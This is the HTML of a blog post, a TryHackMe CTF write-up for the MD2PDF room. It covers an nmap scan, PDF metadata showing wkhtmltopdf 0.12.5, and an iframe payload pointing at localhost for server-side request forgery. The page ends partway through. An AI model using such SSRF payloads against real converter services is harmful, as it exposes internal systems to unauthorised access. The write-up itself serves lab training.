<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TryHackMe | MD2PDF | CTF Writeup - Offensive Blogs â€” Sakibul Ali Khan</title><meta name="description" content="MD2PDFÂ ðŸš€ TopTierConversions LTD is proud to present its latest&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.pages.dev/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.pages.dev/feed.json"><meta property="og:title" content="TryHackMe | MD2PDF | CTF Writeup - Offensive Blogs â€” Sakibul Ali Khan "><meta property="og:image" content="https://sakibulalikhan.pages.dev/media/posts/4/MD2PDF.jpg"><meta property="og:image:width" content="512"><meta property="og:image:height" content="512"><meta property="og:site_name" content="Offensive Blogs â€” Sakibul Ali Khan"><meta property="og:description" content="MD2PDFÂ ðŸš€ TopTierConversions LTD is proud to present its latest&hellip;"><meta property="og:url" content="https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="TryHackMe | MD2PDF | CTF Writeup - Offensive Blogs â€” Sakibul Ali Khan "><meta name="twitter:description" content="MD2PDFÂ ðŸš€ TopTierConversions LTD is proud to present its latest&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.pages.dev/media/posts/4/MD2PDF.jpg"><link rel="shortcut icon" href="https://sakibulalikhan.pages.dev/media/website/download.png" type="image/png"><link rel="shortcut icon" href="https://sakibulalikhan.pages.dev/media/website/download.png" type="image/png"><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/assets/css/style.css?v=d9c8ddd41d5e6bc78fbf1f52183ebdff"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html"},"headline":"TryHackMe | MD2PDF | CTF Writeup","datePublished":"2023-08-19T02:04","dateModified":"2023-08-19T03:10","image":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/posts/4/MD2PDF.jpg","height":512,"width":512},"description":"MD2PDFÂ ðŸš€ TopTierConversions LTD is proud to present its latest&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.pages.dev/authors/sakibulalikhan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan","logo":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/website/new-logo3.png","height":57,"width":50}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript><script defer="defer" src="https://unpkg.com/@tinybirdco/flock.js" data-host="https://api.tinybird.co" data-token="p.eyJ1IjogIjM2YjRmY2Y4LWZhNDYtNGJjMy05MjlkLTFlMmY2ZjBlNGJmMSIsICJpZCI6ICIwZTIzODY1YS02NmY3LTQzODItOTkwOS1jYWEyMjZlZGJmNjEiLCAiaG9zdCI6ICJldV9zaGFyZWQifQ.tDBlzPIX9n77oyAJj53_z9_o0htQ9qO4v6g-ahPBRnk"></script></head><body><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="sakibulalikhan" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF5F5F" data-position="Right" data-x_margin="18" data-y_margin="18"></script><header class="header" id="js-header"><a href="https://sakibulalikhan.pages.dev/" class="logo"><img src="https://sakibulalikhan.pages.dev/media/website/new-logo3.png" alt="Offensive Blogs â€” Sakibul Ali Khan" width="50" height="57"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.pages.dev/" target="_self">Home</a></li><li><a href="https://sakibulalikhan.pages.dev/about.html" target="_self">About Me</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeup/" target="_self">CTF Writeups</a></li><li><a href="https://sakibulalikhan.pages.dev/contact.html" target="_self">Contact Me</a></li></ul></nav></header><main><div class="wrapper"><article class="post"><header class="post__header"><a href="https://sakibulalikhan.pages.dev/tags/tryhackme/" class="post__maintag">Tryhackme</a><h1 class="post__title">TryHackMe | MD2PDF | CTF Writeup</h1><div class="post__meta"><div class="post__author">By <a href="https://sakibulalikhan.pages.dev/authors/sakibulalikhan/" class="invert" rel="author" title="Sakibul Ali Khan">Sakibul Ali Khan</a></div><time datetime="2023-08-19T02:04">August 19, 2023</time><div class="post__comments"><a href="https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#comments"/></svg></a></div></div></header><figure class="post__featured-image"><img src="https://sakibulalikhan.pages.dev/media/posts/4/MD2PDF.jpg" srcset="https://sakibulalikhan.pages.dev/media/posts/4/responsive/MD2PDF-xs.jpg 300w, https://sakibulalikhan.pages.dev/media/posts/4/responsive/MD2PDF-sm.jpg 480w, https://sakibulalikhan.pages.dev/media/posts/4/responsive/MD2PDF-md.jpg 768w, https://sakibulalikhan.pages.dev/media/posts/4/responsive/MD2PDF-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="eager" height="512" width="512" alt="TryHackMe MD2PDF CTF Writeup"></figure><div class="post__inner"><div class="post__entry"><p id="1a74" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">MD2PDF</strong>Â ðŸš€ TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Rightâ€¦?</p><h1 id="838c" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Difficulty = Easy</h1><p id="0d0c" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges:</strong>Â PDF, Markdown, SSRF.</p><p id="3dbc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning we start with Nmap scan. For scan we use â€˜-sVâ€™ flag to know about services &amp; versions. And we also use â€˜-Pnâ€™ flag to not ping to the server.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="2d3f" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-meta">@kali</span>:<span class="hljs-operator">~/</span>ctf$ sudo nmap <span class="hljs-operator">-</span>sV <span class="hljs-operator">-</span><span class="hljs-type">Pn</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">39.142</span><br><span class="hljs-type">Host</span> <span class="hljs-keyword">is</span> up (<span class="hljs-number">0</span>.19s latency).<br><span class="hljs-type">Not</span> shown: <span class="hljs-number">997</span> closed tcp ports (reset)<br><span class="hljs-type">PORT</span> <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">VERSION</span><br><span class="hljs-number">22</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> ssh <span class="hljs-type">OpenSSH</span> <span class="hljs-number">8</span>.2p1 <span class="hljs-type">Ubuntu</span> 4ubuntu0.<span class="hljs-number">5</span> (<span class="hljs-type">Ubuntu</span> <span class="hljs-type">Linux</span>; <span class="hljs-keyword">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> rtsp<br><span class="hljs-number">5000</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> rtsp</span></pre><p id="0245" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">It looks like there are 3 services running on the machine, the standard HTTP server on port 80, an SSH server and another HTTP server on port 5000. The host also appears to be running some version of Ubuntu Server.</p><p id="de9c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Letâ€™s checking the web server on port 80 shows that it converts markdown file to pdf.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anx"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*qLZ7jXKtWTsaqrzO9Kklvw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*qLZ7jXKtWTsaqrzO9Kklvw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*qLZ7jXKtWTsaqrzO9Kklvw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*qLZ7jXKtWTsaqrzO9Kklvw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*qLZ7jXKtWTsaqrzO9Kklvw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*qLZ7jXKtWTsaqrzO9Kklvw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qLZ7jXKtWTsaqrzO9Kklvw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*qLZ7jXKtWTsaqrzO9Kklvw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*qLZ7jXKtWTsaqrzO9Kklvw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*qLZ7jXKtWTsaqrzO9Kklvw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*qLZ7jXKtWTsaqrzO9Kklvw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*qLZ7jXKtWTsaqrzO9Kklvw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*qLZ7jXKtWTsaqrzO9Kklvw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*qLZ7jXKtWTsaqrzO9Kklvw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*qLZ7jXKtWTsaqrzO9Kklvw.png" alt="TryHackMe MD2PDF Writeup" width="700" height="293" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="dda0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Here if i include any markdown code it will be converted to pdf.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km any"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*MQ2gFGX98BxCS3CGdB2oCg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*MQ2gFGX98BxCS3CGdB2oCg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*MQ2gFGX98BxCS3CGdB2oCg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*MQ2gFGX98BxCS3CGdB2oCg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*MQ2gFGX98BxCS3CGdB2oCg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*MQ2gFGX98BxCS3CGdB2oCg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MQ2gFGX98BxCS3CGdB2oCg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*MQ2gFGX98BxCS3CGdB2oCg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*MQ2gFGX98BxCS3CGdB2oCg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*MQ2gFGX98BxCS3CGdB2oCg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*MQ2gFGX98BxCS3CGdB2oCg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*MQ2gFGX98BxCS3CGdB2oCg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*MQ2gFGX98BxCS3CGdB2oCg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*MQ2gFGX98BxCS3CGdB2oCg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*MQ2gFGX98BxCS3CGdB2oCg.png" alt="TryHackMe MD2PDF writeup" width="700" height="269" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="fc2c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">If I click on â€˜Convert to PDFâ€™ button then itâ€™ll convert our Markdown code in PDF file.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZUzToTLxj9JCTW1RtyqypQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZUzToTLxj9JCTW1RtyqypQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZUzToTLxj9JCTW1RtyqypQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZUzToTLxj9JCTW1RtyqypQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZUzToTLxj9JCTW1RtyqypQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZUzToTLxj9JCTW1RtyqypQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZUzToTLxj9JCTW1RtyqypQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*ZUzToTLxj9JCTW1RtyqypQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZUzToTLxj9JCTW1RtyqypQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZUzToTLxj9JCTW1RtyqypQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZUzToTLxj9JCTW1RtyqypQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZUzToTLxj9JCTW1RtyqypQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZUzToTLxj9JCTW1RtyqypQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ZUzToTLxj9JCTW1RtyqypQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*ZUzToTLxj9JCTW1RtyqypQ.png" alt="TryHackMe MD2PDF writeup" width="700" height="259" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="88c7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now weâ€™ll download the generated PDF file to check out the metadata.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="e2ba" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-string">sak@kali:~/ctf$</span> <span class="hljs-string">file</span> <span class="hljs-string">document.pdf</span><br><span class="hljs-attr">document.pdf:</span> <span class="hljs-string">PDF</span> <span class="hljs-string">document,</span> <span class="hljs-string">version</span> <span class="hljs-number">1.4</span><span class="hljs-string">,</span> <span class="hljs-number">0</span> <span class="hljs-string">pages</span><br><span class="hljs-string">sak@kali:~/ctf$</span> <span class="hljs-string">exiftool</span> <span class="hljs-string">document.pdf</span><br><span class="hljs-attr">ExifTool Version Number         :</span> <span class="hljs-number">12.55</span><br><span class="hljs-attr">File Name                       :</span> <span class="hljs-string">document.pdf</span><br><span class="hljs-attr">Directory                       :</span> <span class="hljs-string">.</span><br><span class="hljs-attr">File Size                       :</span> <span class="hljs-number">7.4</span> <span class="hljs-string">kB</span><br><span class="hljs-attr">File Modification Date/Time     :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">06</span><span class="hljs-string">:48:03+06:00</span><br><span class="hljs-attr">File Access Date/Time           :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">20</span><span class="hljs-string">:53:48+06:00</span><br><span class="hljs-attr">File Inode Change Date/Time     :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">20</span><span class="hljs-string">:51:33+06:00</span><br><span class="hljs-attr">File Permissions                :</span> <span class="hljs-string">-rw-rw-r--</span><br><span class="hljs-attr">File Type                       :</span> <span class="hljs-string">PDF</span><br><span class="hljs-attr">File Type Extension             :</span> <span class="hljs-string">pdf</span><br><span class="hljs-attr">MIME Type                       :</span> <span class="hljs-string">application/pdf</span><br><span class="hljs-attr">PDF Version                     :</span> <span class="hljs-number">1.4</span><br><span class="hljs-attr">Linearized                      :</span> <span class="hljs-literal">No</span><br><span class="hljs-attr">Title                           :</span> <br><span class="hljs-attr">Creator                         :</span> <span class="hljs-string">wkhtmltopdf</span> <span class="hljs-number">0.12</span><span class="hljs-number">.5</span><br><span class="hljs-attr">Producer                        :</span> <span class="hljs-string">Qt</span> <span class="hljs-number">4.8</span><span class="hljs-number">.7</span><br><span class="hljs-attr">Create Date                     :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">00</span><span class="hljs-string">:36:44Z</span><br><span class="hljs-attr">Page Count                      :</span> <span class="hljs-number">1</span><br><span class="hljs-attr">Page Mode                       :</span> <span class="hljs-string">UseOutlines</span></span></pre><p id="d43c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In here we see the creator nameÂ <code class="ff abm abn abo abp b">wkhtmltopdf 0.12.5</code>Â weâ€™ll search on google to know if thereâ€™s publicly known exploit for it.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anz"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZMwkdK6VRI1gnPgypxa1zw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZMwkdK6VRI1gnPgypxa1zw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZMwkdK6VRI1gnPgypxa1zw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZMwkdK6VRI1gnPgypxa1zw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZMwkdK6VRI1gnPgypxa1zw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZMwkdK6VRI1gnPgypxa1zw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZMwkdK6VRI1gnPgypxa1zw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*ZMwkdK6VRI1gnPgypxa1zw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZMwkdK6VRI1gnPgypxa1zw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZMwkdK6VRI1gnPgypxa1zw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZMwkdK6VRI1gnPgypxa1zw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZMwkdK6VRI1gnPgypxa1zw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZMwkdK6VRI1gnPgypxa1zw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ZMwkdK6VRI1gnPgypxa1zw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*ZMwkdK6VRI1gnPgypxa1zw.png" alt="TryHackMe MD2PDF writeup" width="700" height="357" loading="lazy" data-is-external-image="true"></figure></div></div></figure><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*FLeQ8hLjn_sGFML83rUyUw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*FLeQ8hLjn_sGFML83rUyUw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*FLeQ8hLjn_sGFML83rUyUw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*FLeQ8hLjn_sGFML83rUyUw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*FLeQ8hLjn_sGFML83rUyUw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*FLeQ8hLjn_sGFML83rUyUw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FLeQ8hLjn_sGFML83rUyUw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*FLeQ8hLjn_sGFML83rUyUw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*FLeQ8hLjn_sGFML83rUyUw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*FLeQ8hLjn_sGFML83rUyUw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*FLeQ8hLjn_sGFML83rUyUw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*FLeQ8hLjn_sGFML83rUyUw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*FLeQ8hLjn_sGFML83rUyUw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*FLeQ8hLjn_sGFML83rUyUw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img src="https://miro.medium.com/v2/resize:fit:700/1*FLeQ8hLjn_sGFML83rUyUw.png" alt="TryHackMe MD2PDF writeup" width="700" height="359" loading="lazy" data-is-external-image="true"></figure></div></div></figure><p id="6c8f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After reading about theÂ <a class="af rn" href="https://cyber-guy.gitbook.io/cyber-guys-blog/blogs/initial-access-via-pdf-file-silently" rel="noopener ugc nofollow" target="_blank">exploit</a>Â shows that we can use iframe tag and perform Server Side Request Forgery</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="8f25" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-title.class">Payload</span>: &lt;iframe src="http://localhost/" width="1000" height="2000"&gt;`</span></pre><p id="ead4" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we if we paste this payload to input section and submit on â€˜Convert to PDF button. Itâ€™s actually not worked</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*JDVQMlBq1k3ewvfT_lJG-A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*JDVQMlBq1k3ewvfT_lJG-A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*JDVQMlBq1k3ewvfT_lJG-A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*JDVQMlBq1k3ewvfT_lJG-A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*JDVQMlBq1k3ewvfT_lJG-A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*JDVQMlBq1k3ewvfT_lJG-A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JDVQMlBq1k3ewvfT_lJG-A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" 